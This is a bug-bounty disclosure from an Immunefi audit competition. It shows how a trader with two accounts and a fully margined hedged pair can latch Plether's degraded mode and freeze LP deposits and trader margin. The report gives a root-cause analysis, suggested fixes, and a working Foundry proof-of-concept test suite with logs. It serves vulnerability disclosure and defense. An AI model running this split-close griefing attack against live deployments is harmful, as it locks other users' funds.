# \#97590 [SC-High] Fully margined hedged pair lets any trader latch degraded mode and freeze LP deposits and trader margin

**Submitted on Nov 2nd 2026 at 14:01:32 UTC by @tchoupilou for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97590
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

A trader with two accounts opens a LONG and a SHORT that each margin their own max profit, so the pair pays no carry. After a basket move of about 1.5 percent the trader closes only the winning leg and CfdEngine latches degraded mode. Queued LP deposits can then be neither activated nor cancelled, traders with an open position cannot withdraw margin, and new opens and deposits are refused, for as long as the trader keeps the other leg. The only protocol exit is an owner donation of L minus E.

## Vulnerability Details

Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, package `packages/perps`, Arbitrum Sepolia release risk parameters.

WHITEPAPER 5.2 (WHITEPAPER.md:916-920) and SECURITY.md:942 already say that a fully margined position holds payout capacity without carry, and that `L <= E < L + B` stops new risk and LP redemption funding. This report is not about that capacity use. In the control test the same pair goes through the same 1.5 percent move and a queued LP deposit still activates.

The issue is the next step. One ordinary close of one leg turns that state into the degraded latch. The latch makes every LP epoch settlement revert, and a junior deposit that has reached its epoch can no longer be cancelled. A senior deposit is a firm commitment from the moment it is accepted. Depositor USDG therefore stays in vault escrow, neither converted to shares nor returned, for as long as the attacker keeps the losing leg open, and that leg costs no carry.

SECURITY.md:27 describes degraded mode as "containment if a terminal transition reveals insolvency". Here no position is underwater. Both legs are fully collateralized, the attacker ends the round trip with only a fee loss, and closing the second leg lets the owner clear the latch without paying. The latch is manufactured by splitting a hedged position in time.

### Root cause

1. The latch. `CfdEngine._enterDegradedModeIfInsolvent` (CfdEngine.sol:1351-1368) sets `degradedMode` when a close leaves `E < L`, with `L = max(bullMaxProfit, bearMaxProfit)`. `clearDegradedMode` (CfdEngine.sol:658-667) is owner only and requires `E >= L`.
2. The split. While both legs are open only one can win, and L counts it once. When the winning leg closes, the pool pays its profit in cash and E drops. The other leg keeps its full max profit in L, and its loss is not cash, so it does not count in E. Any move larger than the buffer B plus the VPI charge of that close pushes E below L. The 1.5 percent move of the PoC is enough, and the control shows that the same move without the split close latches nothing.
3. Free holding. The carry base is `max(maxProfit - margin, 0)` (PositionRiskAccountingLib.sol:48-53), which is 0 for a fully margined leg. The attacker waits for the move and then holds the latch at no running cost.
4. The escrow trap. `HousePool._settleLpEpoch` calls `_requireWithdrawalsLive` first (HousePool.sol:832), which reverts in degraded mode (HousePool.sol:1864-1869). `TrancheVault.cancelPendingDeposit` refuses a junior request once `currentLpEpoch() >= requestId` and refuses every accepted senior request (TrancheVault.sol:851-859). Neither branch has an exception for degraded mode. Deposit epoch rejection, which would return the assets, only happens inside settlement (HousePool.sol:1053). SECURITY.md:877-880 limits junior cancellation to the time before maturity and makes senior deposits firm. Both rules assume settlement keeps running, and one trader can now stop it at will.
5. The trader lock. Every `MarginClearinghouse` withdrawal calls `CfdEngine.checkWithdraw`, which runs `CfdEngineSettlementSidecar.validateWithdraw`. For any account that holds a position it reverts with `CfdEngine__DegradedMode` before it looks at the account's margin (CfdEngineSettlementSidecar.sol:274-276).

### Suggested fix

- Let depositors cancel a pending request, junior or senior, while `ENGINE.degradedMode()` is true. This alone removes the frozen escrow.
- In `validateWithdraw`, apply the degraded check only to withdrawals that would take the account below its initial margin requirement.
- Stop a fully margined pair from holding the envelope for free. Trader margin does not reduce the HousePool endpoint reserve (WHITEPAPER.md:917-918), so the carry base should not fall to zero when margin covers max profit. Alternatively cap the share of L that a single account can hold.

## Impact Details

User funds are frozen for longer than 24 hours. In the PoC a 100,000 USDG junior deposit and a 50,000 USDG senior deposit stay in vault escrow 30 days after the latch, and the depositors can neither cancel them nor have them activated. The attacker chooses the duration and pays nothing while the latch holds. For a junior request the attacker only needs the close to land between the start of its epoch and the next settlement call. `executeOrder` has no access control, so the attacker can submit it themselves at the epoch start. Senior deposits do not need that timing, because they are firm commitments as soon as they are accepted. SECURITY.md:879-880 lists an explicit LP settlement hold as a way to refund senior requests. A junior request that has reached its epoch has no such path.

The protocol stops working for everyone else at the same time. New opens are refused at commit, new LP deposits are refused, and every LP epoch settlement reverts, which also stops redemption funding.

Traders are caught too. Any account that holds a position can no longer withdraw margin, even far above what the position needs. In the fourth test an account with about 4,899 USDG against a 2,000 USDG position withdraws 100 USDG one block before the split close, then gets `CfdEngine__DegradedMode` on the same call right after it and again 30 days later. The only way for a trader to get collateral back is to close the position, which turns a withdrawal into a forced exit.

The owner has two choices. They can donate L minus E from their own wallet, 6,558.26 USDG on a pool of 1,002,000 USDG in the PoC, or wait for the attacker. The attacker needs about twice the pool depth in capital, gets it all back, and pays 7,662.03 USDG in fees and VPI for the whole round trip.

## References

* Degraded latch, `CfdEngine._enterDegradedModeIfInsolvent`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1368
* Owner-only `clearDegradedMode`, requires E >= L: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667
* L = max(bull, bear) in `_maxLiability`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1044-L1049
* Carry base `max(maxProfit - margin, 0)`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/PositionRiskAccountingLib.sol#L48-L53
* `_settleLpEpoch` calls `_requireWithdrawalsLive`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L832
* `_requireWithdrawalsLive` reverts in degraded mode: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1869
* Deposit epoch rejection only inside settlement: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1053
* `cancelPendingDeposit` junior maturity and senior commitment checks: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L859
* Trader withdrawal blocked for any account with a position: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L274-L276
* SECURITY.md, degraded mode as containment when insolvency is revealed: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L27
* SECURITY.md, junior cancellation before maturity and firm senior deposits: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L877-L880
* SECURITY.md, `L <= E < L + B` capacity rule: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L942
* WHITEPAPER 5.2, fully margined positions and carry pricing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L916-L920


## Proof of Concept

All four tests pass on the audited commit. Every step of the scenario goes through production entrypoints. Traders call `OrderRouter.commitOrder(OrderRequest)` and `CfdEngine.addMargin`. An arbitrary address calls `OrderRouter.executeOrder` and `OrderRouter.settleLpEpoch` with Pyth update data. The owner appears only in the recovery steps.

```
Ran 4 tests for test/perps/DegradedModeHedgedPairE2E.t.sol:DegradedModeHedgedPairE2E
[PASS] test_attack_latchAlsoFreezesOpenTradersFreeMargin() (gas: 18679056)
Logs:
  honest trader withdrew before the latch      100000000
  honest trader settlement balance after latch 4898975919

[PASS] test_attack_splitCloseFreezesMaturedLpDepositAndHaltsProtocol() (gas: 18714452)
Logs:
  == pair open (fully margined, zero carry) ==
    effective assets E       1002000386308
    max liability L          998800000000
    degradedMode             false
  == attacker closed only the winning LONG leg ==
    effective assets E       992241741272
    max liability L          998800000000
    degradedMode             true
  depositor USDG frozen in escrow after 30 days 100000000000
  owner must donate L - E    6558258728

[PASS] test_attackerReleasesAtWillAndPaysOnlyFees() (gas: 17430186)
Logs:
  attacker funding in         2117576000000
  attacker balances out       2109913965244
  attacker net cost           7662034756

[PASS] test_control_samePairSameMoveWithoutSplitCloseActivatesDeposit() (gas: 15603811)
Logs:
  == control: pair held through the same 1.5% move, no close ==
    effective assets E       1002000386308
    max liability L          998800000000
    degradedMode             false

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 176.32ms (442.38ms CPU time)

Ran 1 test suite in 178.07ms (176.32ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```

What the attack test asserts, in order.

- Both legs have a borrow base of 0 and owe 0 carry after 30 days.
- A junior LP queues a 100,000 USDG deposit and a senior LP queues 50,000 USDG. The junior request reaches its epoch.
- The attacker closes only the LONG at a basket 1.5 percent lower. E falls to 992,241.74 USDG against L of 998,800 USDG and `degradedMode` is true.
- `OrderRouter.settleLpEpoch` reverts with `HousePool__DegradedMode`, so the deposit is not activated.
- `cancelPendingDeposit` reverts with `TrancheVault__DepositEpochAlreadyActive` for the junior LP and with `TrancheVault__SeniorDepositCommitted` for the senior LP.
- A new `requestDeposit` reverts with `TrancheVault__DepositsUnavailable`. A new open reverts at commit with `OrderRouter__DegradedMode`.
- `clearDegradedMode` reverts with `CfdEngine__StillInsolvent`.
- 30 days later the latch is still set, settlement and the junior cancel still revert, `clearDegradedMode` still reverts, the held SHORT still owes 0 carry, and the 100,000 USDG is still in escrow.
- The owner donates exactly L minus E, 6,558.26 USDG, through `recapitalizePool`. Only then does `clearDegradedMode` succeed.

The control test runs the same pair, the same move and the same deposit without the split close. There is no latch and the same `settleLpEpoch` call activates the deposit. The third test closes the SHORT after the latch. The attacker deposited 2,117,576 USDG and got back 2,109,913.97 USDG, so the whole attack cost 7,662.03 USDG in fees and VPI, and the owner can then clear the latch without paying. The release is in the attacker's hands.

The fourth test adds an honest trader who opens a 2,000 USDG SHORT before the pair and keeps free margin above it. A 100 USDG `withdrawMargin` goes through one block before the split close. Right after the close, and again 30 days later, the same call reverts with `CfdEngine__DegradedMode`. In this test the pair is sized 5,000 USDG smaller to leave admission room for that position.

### Reproduce

1. Save the file below as `packages/perps/test/perps/DegradedModeHedgedPairE2E.t.sol`. It extends the project's own `BasePerpTest`.
2. Run `forge test --root packages/perps --match-path test/perps/DegradedModeHedgedPairE2E.t.sol -vv`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
// vm.getBlockTimestamp() throughout: under via-IR `block.timestamp` is cached inside a test function after vm.warp.
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console} from "forge-std/console.sol";

/// @notice End to end: a trader with two accounts latches Engine degraded mode with a fully margined LONG/SHORT pair,
///         using only production entrypoints. Traders call `OrderRouter.commitOrder(OrderRequest)` and
///         `CfdEngine.addMargin`, an unprivileged keeper calls `OrderRouter.executeOrder` with Pyth update data, and LP
///         epochs are settled through the permissionless `OrderRouter.settleLpEpoch`. No call in the scenario is pranked
///         as a protocol contract (only the shared BasePerpTest setUp seeds the initial tranches that way). The owner
///         appears only in the recovery steps. Risk parameters are the Arbitrum Sepolia release defaults.
contract DegradedModeHedgedPairE2E is BasePerpTest {

    address internal attackerLong = makeAddr("attackerLong");
    address internal attackerShort = makeAddr("attackerShort");
    address internal keeper = makeAddr("keeper");
    address internal honestTrader = makeAddr("honestTrader");
    address internal newLp = makeAddr("newLp");
    address internal seniorLp = makeAddr("seniorLp");
    address internal lateLp = makeAddr("lateLp");

    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant CLOSE_PRICE = 98_500_000; // basket 1.5% lower
    uint256 internal constant TRANCHES = 4;
    uint256 internal constant NEW_LP_DEPOSIT = 100_000e6;
    uint256 internal constant SENIOR_LP_DEPOSIT = 50_000e6;

    uint256 internal clientNonce;
    uint256 internal attackerFunding;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ---------------------------------------------------------------- production entrypoints

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("hedged-pair-poc", ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// @dev Trader commits through the Router, then an unprivileged keeper executes with a Pyth update at `price`.
    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, isClose);
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory pythUpdate = _mockPythUpdateData(price);
        vm.prank(keeper);
        result = router.executeOrder(orderId, pythUpdate);
    }

    function _tradeExecuted(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        OrderV3Types.ExecutionResult memory result = _trade(trader, side, size, margin, isClose, price);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _mockPythUpdateData(price);
        vm.prank(keeper);
        router.updateMarkPrice(pythUpdate);
    }

    function _warpToLiveMarket(
        uint256 delta
    ) internal {
        vm.warp(vm.getBlockTimestamp() + delta);
        for (uint256 i; i < 200 && engine.isOracleFrozen(); ++i) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        assertFalse(engine.isOracleFrozen(), "scenario runs in a live market window");
    }

    function _effectiveAssets() internal view returns (uint256) {
        uint256 assets = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return assets > claims ? assets - claims : 0;
    }

    // ---------------------------------------------------------------- scenario building blocks

    /// @dev LONG and SHORT legs, each margined to its own maximum profit, opened in alternating tranches so skew stays
    ///      under maxSkewRatio. The pair fills the payout envelope up to the open-admission limit E >= L + B.
    function _openFullyMarginedPair() internal returns (uint256 sizePerSide) {
        sizePerSide = _openFullyMarginedPairLeaving(0);
    }

    /// @dev Same pair, sized to leave `room` assets of admission capacity for another trader's position.
    function _openFullyMarginedPairLeaving(
        uint256 room
    ) internal returns (uint256 sizePerSide) {
        uint256 depth = pool.totalAssets();
        uint256 targetMaxProfitAssets = depth * 10_000 / 10_025 - 500e6 - room;
        uint256 tranche = (targetMaxProfitAssets / TRANCHES) * 1e12;
        tranche = tranche / 1e20 * 1e20; // multiple of SIZE_QUANTUM
        sizePerSide = tranche * TRANCHES;
        uint256 marginPerTranche = tranche / 1e12 + tranche / 1e12 / 100;

        uint256 perAccount = marginPerTranche * TRANCHES + 50_000e6;
        _fundTrader(attackerLong, perAccount);
        _fundTrader(attackerShort, perAccount);
        attackerFunding = 2 * perAccount;

        for (uint256 i; i < TRANCHES; ++i) {
            _tradeExecuted(attackerLong, CfdTypes.Side.LONG, tranche, marginPerTranche, false, ENTRY_PRICE);
            _tradeExecuted(attackerShort, CfdTypes.Side.SHORT, tranche, marginPerTranche, false, ENTRY_PRICE);
        }
        _topUpToZeroBorrowBase(attackerLong);
        _topUpToZeroBorrowBase(attackerShort);

        assertEq(_positionBorrowBaseAssets(attackerLong), 0, "LONG leg fully margined: zero carry base");
        assertEq(_positionBorrowBaseAssets(attackerShort), 0, "SHORT leg fully margined: zero carry base");
        assertFalse(engine.degradedMode(), "admission kept E >= L + B");
    }

    function _topUpToZeroBorrowBase(
        address account
    ) internal {
        uint256 borrowBase = _positionBorrowBaseAssets(account);
        if (borrowBase != 0) {
            vm.prank(account);
            engine.addMargin(account, borrowBase + 1e6);
        }
    }

    /// @dev Pair is held 30 days at zero carry, then the basket moves 1.5% and a keeper refreshes the mark.
    function _holdAndMove() internal {
        _warpToLiveMarket(30 days);
        _refreshMark(ENTRY_PRICE);
        assertEq(_expectedIndexedCarryAssets(attackerLong), 0, "no carry on the LONG leg after 30 days");
        assertEq(_expectedIndexedCarryAssets(attackerShort), 0, "no carry on the SHORT leg after 30 days");
        _refreshMark(CLOSE_PRICE);
    }

    /// @dev A new junior LP queues a deposit. It is cancellable until its epoch starts (SECURITY.md:878).
    function _requestJuniorDeposit() internal returns (uint256 requestId) {
        settlementToken.mint(newLp, NEW_LP_DEPOSIT);
        vm.startPrank(newLp);
        settlementToken.approve(address(juniorVault), NEW_LP_DEPOSIT);
        requestId = juniorVault.requestDeposit(NEW_LP_DEPOSIT, newLp, newLp);
        vm.stopPrank();
    }

    /// @dev Moves to the deposit's epoch start: the request has matured and waits for the next LP settlement.
    function _warpToMaturity(
        uint256 requestId
    ) internal {
        uint256 activation = juniorVault.depositEpochStart(requestId);
        if (vm.getBlockTimestamp() < activation) {
            vm.warp(activation);
        }
        assertFalse(engine.isOracleFrozen(), "deposit epoch boundary is in a live market window");
    }

    function _settleLpEpochAsKeeper(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _mockPythUpdateData(price);
        vm.prank(keeper);
        router.settleLpEpoch(pythUpdate);
    }

    function _logState(
        string memory label
    ) internal view {
        console.log(label);
        console.log("  effective assets E      ", _effectiveAssets());
        console.log("  max liability L         ", _maxLiability());
        console.log("  degradedMode            ", engine.degradedMode());
    }

    // ---------------------------------------------------------------- tests

    /// @notice Attack: a new junior LP's deposit has matured and waits for settlement. The attacker closes only the
    ///         winning leg. Degraded mode latches and the depositors' USDG can neither be activated nor cancelled,
    ///         30 days later included. The only protocol exit is an owner donation of L - E.
    function test_attack_splitCloseFreezesMaturedLpDepositAndHaltsProtocol() public {
        uint256 sizePerSide = _openFullyMarginedPair();
        _logState("== pair open (fully margined, zero carry) ==");
        _holdAndMove();

        uint256 depositId = _requestJuniorDeposit();
        settlementToken.mint(seniorLp, SENIOR_LP_DEPOSIT);
        vm.startPrank(seniorLp);
        settlementToken.approve(address(seniorVault), SENIOR_LP_DEPOSIT);
        uint256 seniorId = seniorVault.requestDeposit(SENIOR_LP_DEPOSIT, seniorLp, seniorLp);
        vm.stopPrank();
        _warpToMaturity(depositId);

        _tradeExecuted(attackerLong, CfdTypes.Side.LONG, sizePerSide, 0, true, CLOSE_PRICE);
        _logState("== attacker closed only the winning LONG leg ==");
        assertTrue(engine.degradedMode(), "one ordinary close latched protocol-wide degraded mode");

        // 1. The matured deposit cannot be activated: every LP epoch settlement reverts.
        bytes[] memory settleUpdate = _mockPythUpdateData(CLOSE_PRICE);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        vm.prank(keeper);
        router.settleLpEpoch(settleUpdate);

        // 2. And it cannot be cancelled: a junior deposit is cancellable only before maturity.
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        vm.prank(newLp);
        juniorVault.cancelPendingDeposit(depositId);
        vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
        vm.prank(seniorLp);
        seniorVault.cancelPendingDeposit(seniorId);

        // 3. Nobody else can enter: new LP deposits and new trader opens are refused.
        settlementToken.mint(lateLp, NEW_LP_DEPOSIT);
        vm.startPrank(lateLp);
        settlementToken.approve(address(juniorVault), NEW_LP_DEPOSIT);
        vm.expectRevert(TrancheVault.TrancheVault__DepositsUnavailable.selector);
        juniorVault.requestDeposit(NEW_LP_DEPOSIT, lateLp, lateLp);
        vm.stopPrank();

        _fundTrader(honestTrader, 20_000e6);
        OrderV3Types.OrderRequest memory openRequest = _request(CfdTypes.Side.LONG, 10_000e18, 2_000e6, false);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        vm.prank(honestTrader);
        router.commitOrder(openRequest);

        // 4. Thirty days later nothing has changed. The held SHORT leg still pays no carry.
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        _warpToLiveMarket(30 days);
        _refreshMark(CLOSE_PRICE);
        assertTrue(engine.degradedMode(), "latch still set 30 days later");
        assertEq(_expectedIndexedCarryAssets(attackerShort), 0, "held SHORT leg still accrues no carry");
        settleUpdate = _mockPythUpdateData(CLOSE_PRICE);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        vm.prank(keeper);
        router.settleLpEpoch(settleUpdate);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        vm.prank(newLp);
        juniorVault.cancelPendingDeposit(depositId);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        assertEq(juniorVault.pendingDepositRequest(depositId, newLp), NEW_LP_DEPOSIT, "100k USDG still in escrow");
        assertEq(settlementToken.balanceOf(newLp), 0, "depositor holds none of its USDG");
        console.log("depositor USDG frozen in escrow after 30 days", juniorVault.pendingDepositRequest(depositId, newLp));

        // 5. The only exit left to the protocol is an owner donation of L - E.
        uint256 gap = _maxLiability() - _effectiveAssets();
        console.log("owner must donate L - E   ", gap);
        settlementToken.mint(address(this), gap);
        settlementToken.approve(address(engine), gap);
        engine.recapitalizePool(gap);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "the latch clears only after the owner paid L - E");
    }

    /// @notice Control: same pair, same 1.5% move, same matured deposit, same Router call, but no split close. The
    ///         deposit activates. The freeze comes from closing one leg, not from the price move or from the
    ///         documented capacity use of a fully margined pair (WHITEPAPER 5.2, SECURITY.md:942).
    function test_control_samePairSameMoveWithoutSplitCloseActivatesDeposit() public {
        _openFullyMarginedPair();
        _holdAndMove();
        uint256 depositId = _requestJuniorDeposit();
        _warpToMaturity(depositId);
        _logState("== control: pair held through the same 1.5% move, no close ==");
        assertFalse(engine.degradedMode(), "control: no latch without the split close");

        _settleLpEpochAsKeeper(CLOSE_PRICE);
        assertEq(juniorVault.pendingDepositRequest(depositId, newLp), 0, "control: deposit consumed");
        assertEq(
            juniorVault.claimableDepositRequest(depositId, newLp), NEW_LP_DEPOSIT, "control: new LP deposit activates"
        );
    }

    /// @notice Attacker economics: after the latch the attacker can release it at will by closing the SHORT leg. The
    ///         full round trip (two opens, two closes, 30 days held) costs only trading fees and VPI.
    function test_attackerReleasesAtWillAndPaysOnlyFees() public {
        uint256 sizePerSide = _openFullyMarginedPair();
        _holdAndMove();
        _tradeExecuted(attackerLong, CfdTypes.Side.LONG, sizePerSide, 0, true, CLOSE_PRICE);
        assertTrue(engine.degradedMode(), "latched");

        _warpToLiveMarket(1 days);
        _tradeExecuted(attackerShort, CfdTypes.Side.SHORT, sizePerSide, 0, true, CLOSE_PRICE);

        uint256 attackerEnd = clearinghouse.balanceAssets(attackerLong) + clearinghouse.balanceAssets(attackerShort)
            + engine.traderClaimBalanceAssets(attackerLong) + engine.traderClaimBalanceAssets(attackerShort);
        console.log("attacker funding in        ", attackerFunding);
        console.log("attacker balances out      ", attackerEnd);
        console.log("attacker net cost          ", attackerFunding - attackerEnd);
        assertLe(attackerEnd, attackerFunding, "the attack is pure griefing: no profit");

        assertGe(_effectiveAssets(), _maxLiability(), "SHORT close restores E >= L");
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "release is in the attacker's hands");
    }

    /// @notice Third parties with an open position: an honest trader holds a small position and free margin above it.
    ///         Just before the split close a 100 USDG withdrawal goes through. Just after it the same withdrawal
    ///         reverts with CfdEngine__DegradedMode, and still does 30 days later. Closing the position is the only way
    ///         to get collateral back.
    function test_attack_latchAlsoFreezesOpenTradersFreeMargin() public {
        _fundTrader(honestTrader, 5_000e6);
        _tradeExecuted(honestTrader, CfdTypes.Side.SHORT, 2_000e18, 1_000e6, false, ENTRY_PRICE);
        uint256 sizePerSide = _openFullyMarginedPairLeaving(5_000e6);
        _holdAndMove();

        uint256 before = settlementToken.balanceOf(honestTrader);
        vm.prank(honestTrader);
        clearinghouse.withdrawMargin(100e6);
        assertEq(settlementToken.balanceOf(honestTrader), before + 100e6, "control: withdrawal works before the latch");
        console.log("honest trader withdrew before the latch     ", settlementToken.balanceOf(honestTrader) - before);

        _tradeExecuted(attackerLong, CfdTypes.Side.LONG, sizePerSide, 0, true, CLOSE_PRICE);
        assertTrue(engine.degradedMode(), "latched by the split close");

        uint256 free = clearinghouse.balanceAssets(honestTrader);
        console.log("honest trader settlement balance after latch", free);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        vm.prank(honestTrader);
        clearinghouse.withdrawMargin(100e6);

        _warpToLiveMarket(30 days);
        _refreshMark(CLOSE_PRICE);
        assertTrue(engine.degradedMode(), "latch still set 30 days later");
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        vm.prank(honestTrader);
        clearinghouse.withdrawMargin(100e6);
        assertEq(settlementToken.balanceOf(honestTrader), before + 100e6, "nothing more left the account in 30 days");
    }

}
```

